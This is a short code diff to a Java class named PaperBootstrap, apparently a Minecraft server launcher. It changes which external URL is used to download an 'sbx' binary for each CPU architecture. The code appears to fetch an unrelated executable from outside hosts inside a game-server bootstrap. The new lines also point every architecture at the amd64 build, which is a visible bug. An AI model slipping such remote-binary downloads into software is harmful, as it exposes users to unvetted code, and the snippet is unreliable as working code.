@@ -146,11 +146,11 @@ public final class PaperBootstrap {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/s-box";
+            url = "https://github.com/eooce/test/releases/download/amd64/sbx";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/s-box";
+            url = "https://github.com/eooce/test/releases/download/amd64/sbx";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/s-box";
+            url = "https://github.com/eooce/test/releases/download/amd64/sbx";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
